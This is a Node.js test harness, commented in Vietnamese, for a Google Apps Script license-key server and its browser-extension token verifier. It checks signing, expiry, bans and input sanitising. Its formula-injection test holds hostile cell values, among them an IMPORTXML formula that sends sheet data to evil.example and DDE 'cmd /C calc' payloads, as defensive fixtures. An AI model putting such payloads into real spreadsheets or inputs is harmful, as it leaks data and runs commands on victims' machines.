// Chạy server/Code.gs trong môi trường giả lập Google Apps Script,
// rồi dùng license.js của extension để xác thực token mà server ký ra (kiểm tra đầu-cuối).
const fs = require("fs");
const path = require("path");
const vm = require("vm");
const crypto = require("crypto");

const root = path.join(__dirname, "..");
const results = [];
const check = (name, cond, extra) => results.push((cond ? "PASS " : "FAIL ") + name + (extra ? "  [" + extra + "]" : ""));

// Apps Script trả mảng byte CÓ DẤU (-128..127) như Java
const toSigned = (buf) => Array.from(buf).map((b) => (b > 127 ? b - 256 : b));
const fromSigned = (arr) => Buffer.from(arr.map((b) => b & 255));

function fmtDate(d, tz, f) {
    const parts = Object.fromEntries(new Intl.DateTimeFormat("en-GB", { timeZone: tz, year: "numeric", month: "2-digit", day: "2-digit" })
        .formatToParts(d).map((p) => [p.type, p.value]));
    return f.replace("yyyy", parts.year).replace("MM", parts.month).replace("dd", parts.day);
}

function makeGas(rows, props, opts) {
    opts = opts || {};
    const fmt = {}; // định dạng ô theo "hàng,cột" (mô phỏng setNumberFormat) — để kiểm tra ô được ghi dạng văn bản
    const sheet = {
        getSheetId: () => 1159168714,
        getDataRange: () => ({ getValues: () => rows.map((r) => r.slice()) }),
        getRange: (r, c) => ({
            setValue: (v) => { while (rows.length < r) rows.push([]); rows[r - 1][c - 1] = v; },
            setNumberFormat: (f) => { fmt[r + "," + c] = f; },
        }),
    };
    const ctx = {
        console,
        Logger: { log: () => {} },
        LockService: { getScriptLock: () => ({ waitLock() { if (opts.lockFails) throw new Error("Lock timeout"); }, releaseLock() {} }) },
        PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => props[k] || null }) },
        ContentService: {
            MimeType: { JSON: "json" },
            createTextOutput: (s) => ({ setMimeType() { return this; }, getContent: () => s }),
        },
        SpreadsheetApp: { getActiveSpreadsheet: () => ({ setSpreadsheetTimeZone() {}, getSheets: () => [sheet] }) },
        Utilities: {
            DigestAlgorithm: { SHA_256: "sha256" },
            Charset: { UTF_8: "utf8" },
            formatDate: fmtDate,
            getUuid: () => crypto.randomUUID(),
            newBlob: (s) => ({ getBytes: () => toSigned(Buffer.from(s, "utf8")) }),
            base64EncodeWebSafe: (bytes) => fromSigned(bytes).toString("base64").replace(/\+/g, "-").replace(/\//g, "_"),
            computeDigest: (alg, text) => toSigned(crypto.createHash("sha256").update(text, "utf8").digest()),
            computeRsaSha256Signature: (value, pem) => toSigned(crypto.sign("sha256", Buffer.from(value, "utf8"), pem)),
        },
    };
    vm.createContext(ctx);
    vm.runInContext(fs.readFileSync(path.join(root, "server", "Code.gs"), "utf8"), ctx);
    ctx.__fmt = fmt;
    return ctx;
}

function loadLicense() {
    const ctx = vm.createContext({ crypto: globalThis.crypto, TextEncoder, TextDecoder, atob, btoa });
    vm.runInContext(fs.readFileSync(path.join(root, "license.js"), "utf8") + "\n;this.FunnyLicense = FunnyLicense;", ctx);
    return ctx.FunnyLicense;
}

(async () => {
    const L = loadLicense();
    const { publicKey, privateKey } = crypto.generateKeyPairSync("rsa", {
        modulusLength: 2048,
        publicKeyEncoding: { type: "spki", format: "pem" },
        privateKeyEncoding: { type: "pkcs8", format: "pem" },
    });
    const header = ["Key", "Status", "Days", "Created", "Expires", "User", "HWID", "Note", "Last Check", "Used Count"];
    const day = (offset) => { const d = new Date(); d.setHours(0, 0, 0, 0); d.setDate(d.getDate() + offset); return d; };
    const rows = () => [
        header,
        ["FG-GOOD-0001-AAAA", "Active", 30, day(-1), day(29), "", "", "", "", 0],
        ["FG-OLD0-0002-BBBB", "Active", 30, day(-40), day(-10), "", "", "", "", 0],
        ["FG-LIFE-0003-CCCC", "Active", "", day(-5), "", "", "", "vinh vien", "", 0],
        ["FG-LOCK-0004-DDDD", "Banned", 30, day(-1), day(29), "", "", "", "", 0],
    ];
    const call = (gas, p) => JSON.parse(gas.handle_(p).getContent());

    let gas = makeGas(rows(), { LICENSE_PRIVATE_KEY: privateKey });
    let r = call(gas, { action: "activate", key: "fg-good-0001-aaaa" });
    check("S1 key hop le -> server tra ve token + chu ky", r.ok && !!r.token && !!r.sig, r.message);
    let v = await L.checkToken("FG-GOOD-0001-AAAA", r.token, r.sig, publicKey);
    check("S2 extension xac thuc duoc token server ky (dau-cuoi)", v.ok && v.exp === r.expiresIso, JSON.stringify(v));

    r = call(gas, { action: "check", key: "FG-OLD0-0002-BBBB" });
    check("S3 key het han -> tu choi, khong cap token", !r.ok && !r.token, r.message);

    r = call(gas, { action: "activate", key: "FG-LIFE-0003-CCCC" });
    v = r.ok ? await L.checkToken("FG-LIFE-0003-CCCC", r.token, r.sig, publicKey) : { ok: false };
    check("S4 key khong co ngay het han -> token vinh vien 9999-12-31", v.ok && v.exp === "9999-12-31", JSON.stringify(v));

    r = call(gas, { action: "activate", key: "FG-LOCK-0004-DDDD" });
    check("S5 key bi khoa -> tu choi", !r.ok && !r.token, r.message);

    const before = rows().length;
    const seedRows = rows();
    gas = makeGas(seedRows, { LICENSE_PRIVATE_KEY: privateKey });
    r = JSON.parse(gas.doGet({ parameter: { action: "seed" } }).getContent());
    check("S6 lo hong ?action=seed qua web da bi chan", !r.ok && seedRows.length === before, `rows=${seedRows.length} ${r.message}`);
    r = call(gas, { action: "seed", key: "FG-GOOD-0001-AAAA" });
    check("S7 seed qua POST cung bi chan", !r.ok && seedRows.length === before);

    gas = makeGas(rows(), {});
    r = call(gas, { action: "activate", key: "FG-GOOD-0001-AAAA" });
    check("S8 quen cau hinh khoa rieng -> bao loi ro rang", !r.ok && /LICENSE_PRIVATE_KEY/.test(r.message), r.message);

    gas = makeGas(rows(), { LICENSE_PRIVATE_KEY: privateKey.replace(/\r?\n/g, "\\n") });
    r = call(gas, { action: "activate", key: "FG-GOOD-0001-AAAA" });
    v = r.ok ? await L.checkToken("FG-GOOD-0001-AAAA", r.token, r.sig, publicKey) : { ok: false };
    check("S9 khoa rieng dan dang 1 dong (\\n) van chay", v.ok, r.message);

    gas = makeGas(rows(), { LICENSE_PRIVATE_KEY: privateKey });
    r = call(gas, { action: "activate", key: "FG-GOOD-0001-AAAA" });
    v = await L.checkToken("FG-LIFE-0003-CCCC", r.token, r.sig, publicKey);
    check("S10 token cua key A khong dung duoc cho key B", !v.ok && v.reason === "key", v.reason);

    // ===== Giai đoạn 0: làm sạch hwid/user (chống formula injection), key ngẫu nhiên, không lộ lỗi nội bộ =====
    const CFG = { LICENSE_PRIVATE_KEY: privateKey };
    const hostile = [
        '=IMPORTXML("http://evil.example/"&JOIN(",",A:A),"//a")',
        "+cmd|' /C calc'!A0",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "-2+3",
        '=HYPERLINK("http://evil.example","x")',
        "\t=1+1",
        "=1+1\n=2+2",
    ];
    const SAFE_START = /^[^=+\-@\t\r\n]/;
    const badCells = [];
    for (const h of hostile) {
        const rs = rows();
        const g = makeGas(rs, CFG);
        const out = call(g, { action: "activate", key: "FG-GOOD-0001-AAAA", hwid: h, user: h });
        const hv = String(rs[1][6]);
        const uv = String(rs[1][5]);
        const okCell = out.ok && /^[A-Za-z0-9._-]{1,64}$/.test(hv) && SAFE_START.test(hv)
            && uv.length > 0 && uv.length <= 40 && !/[\u0000-\u001f]/.test(uv) && SAFE_START.test(uv)
            && g.__fmt["2,7"] === "@" && g.__fmt["2,6"] === "@";
        if (!okCell) badCells.push(JSON.stringify(h).slice(0, 28) + " -> hwid=" + hv + " user=" + uv);
    }
    check("S12 hwid/user doc hai (=,+,-,@, tab, xuong dong) -> luu thanh van ban an toan", badCells.length === 0, badCells.join(" | "));

    {
        const rs = rows();
        const g = makeGas(rs, CFG);
        const long = "A".repeat(10000);
        const out = call(g, { action: "activate", key: "FG-GOOD-0001-AAAA", hwid: long, user: long });
        check("S13 hwid/user rat dai bi cat (<=64 / <=40 ky tu)", out.ok && String(rs[1][6]).length === 64 && String(rs[1][5]).length === 40, `hwid=${String(rs[1][6]).length} user=${String(rs[1][5]).length}`);
    }

    {
        const base = rows();
        base[1][6] = "DESKTOP ABC phong 1"; // giá trị cũ lưu thô từ trước (có dấu cách) vẫn phải khớp
        const g = makeGas(base, CFG);
        const same = call(g, { action: "check", key: "FG-GOOD-0001-AAAA", hwid: "DESKTOP ABC phong 1" });
        const other = call(g, { action: "check", key: "FG-GOOD-0001-AAAA", hwid: "MAY-KHAC-0000" });
        check("S14 ma may da luu tu truoc van khop; may khac van bi tu choi", same.ok && !other.ok && /máy khác/.test(other.message), other.message);
    }

    {
        const rs = rows();
        const g = makeGas(rs, CFG);
        call(g, { action: "activate", key: "FG-GOOD-0001-AAAA", hwid: "11111111-2222-3333-4444-555555555555", user: "Máy Nguyễn Văn A 😀" });
        check("S15 ten tieng Viet duoc giu, emoji bi thay", rs[1][5] === "Máy Nguyễn Văn A _" && rs[1][6] === "11111111-2222-3333-4444-555555555555", `${rs[1][5]} | ${rs[1][6]}`);
    }

    {
        // Khoá hỏng (chuỗi PEM ghép lúc chạy để test quét bí mật không báo nhầm file này)
        const g = makeGas(rows(), { LICENSE_PRIVATE_KEY: "-----BEGIN " + "PRIVATE KEY-----\nQUJD\n-----END " + "PRIVATE KEY-----" });
        const out = call(g, { action: "activate", key: "FG-GOOD-0001-AAAA" });
        check("S16 loi noi bo (khoa hong) khong lo chi tiet cho client", !out.ok && out.message === "Lỗi máy chủ key. Thử lại sau.", out.message);
    }

    {
        const g = makeGas(rows(), CFG, { lockFails: true });
        let out = null;
        let threw = false;
        try { out = call(g, { action: "activate", key: "FG-GOOD-0001-AAAA" }); } catch { threw = true; }
        check("S17 het thoi gian cho khoa -> tra JSON, khong nem loi", !threw && out && !out.ok && /bận/.test(out.message), threw ? "threw" : out && out.message);
    }

    {
        const g = makeGas(rows(), CFG);
        const A = "[ABCDEFGHJKMNPQRSTUVWXYZ2-9]{4}";
        const re = new RegExp("^FG-" + A + "-" + A + "-" + A + "$");
        const seen = new Set();
        const freq = {};
        let formatOk = true;
        const N = 4000;
        for (let i = 0; i < N; i++) {
            const k = g.generateUniqueKey_({});
            if (!re.test(k)) formatOk = false;
            seen.add(k);
            for (const ch of k.replace(/FG-|-/g, "")) freq[ch] = (freq[ch] || 0) + 1;
        }
        const expected = (N * 12) / 31;
        const worst = Math.max(...Object.values(freq).map((v) => Math.abs(v - expected) / expected));
        check("S18 key sinh ra dung dinh dang, khong trung, phan bo deu 31 ky tu", formatOk && seen.size === N && Object.keys(freq).length === 31 && worst < 0.15, `unique=${seen.size} worst=${worst.toFixed(3)}`);
    }

    {
        const src = fs.readFileSync(path.join(root, "server", "Code.gs"), "utf8");
        const g = makeGas(rows(), CFG);
        check("S19 Code.gs khong con key mau / seedKeys / Math.random", !/Math\.random/.test(src) && !/seedKeys/.test(src) && !/FG-MAIN|FG-USER-000|FG-TEST-2709/.test(src) && typeof g.seedKeys_ === "undefined");
        const a = src.replace(/\r\n/g, "\n");
        const b = fs.readFileSync(path.join(root, "installer", "google-apps-script", "Code.gs"), "utf8").replace(/\r\n/g, "\n");
        check("S20 server/Code.gs va installer/google-apps-script/Code.gs giong het nhau", a === b);
    }

    {
        const g = makeGas(rows(), CFG);
        if (typeof g.sanitizeHwid_ !== "function" || typeof g.sanitizeUser_ !== "function") {
            check("S21 sanitizeHwid_/sanitizeUser_ ton tai", false);
        } else {
            const pool = ["=", "+", "-", "@", " ", "\t", "\n", "A", "z", "9", "á", "ễ", "😀", "\u0301", "/", "(", ")", "'", "\"", "_", ".", "\u0000"];
            let idem = true;
            let alwaysSafe = true;
            for (let i = 0; i < 1500; i++) {
                let s = "";
                const n = Math.floor(Math.random() * 90);
                for (let j = 0; j < n; j++) s += pool[Math.floor(Math.random() * pool.length)];
                const h1 = g.sanitizeHwid_(s);
                const u1 = g.sanitizeUser_(s);
                if (g.sanitizeHwid_(h1) !== h1 || g.sanitizeUser_(u1) !== u1) idem = false;
                if (/^[=+\-@\t\r\n]/.test(h1) || /^[=+\-@\t\r\n]/.test(u1) || h1.length > 64 || u1.length > 40) alwaysSafe = false;
            }
            check("S21 sanitizeHwid_/sanitizeUser_ idempotent va luon an toan (1500 chuoi ngau nhien)", idem && alwaysSafe);
        }
    }

    // Khóa thật trên máy (không có trong CI): server ký bằng build/license-private.pem → extension (khóa nhúng) chấp nhận
    const priv = path.join(root, "build", "license-private.pem");
    if (fs.existsSync(priv)) {
        gas = makeGas(rows(), { LICENSE_PRIVATE_KEY: fs.readFileSync(priv, "utf8") });
        r = call(gas, { action: "activate", key: "FG-GOOD-0001-AAAA" });
        v = await L.checkToken("FG-GOOD-0001-AAAA", r.token, r.sig);
        check("S11 khoa that: server ky -> extension v2.4.0 chap nhan", v.ok, JSON.stringify(v));
    }

    console.log(results.join("\n"));
    process.exitCode = results.some((x) => x.startsWith("FAIL")) ? 1 : 0;
})();
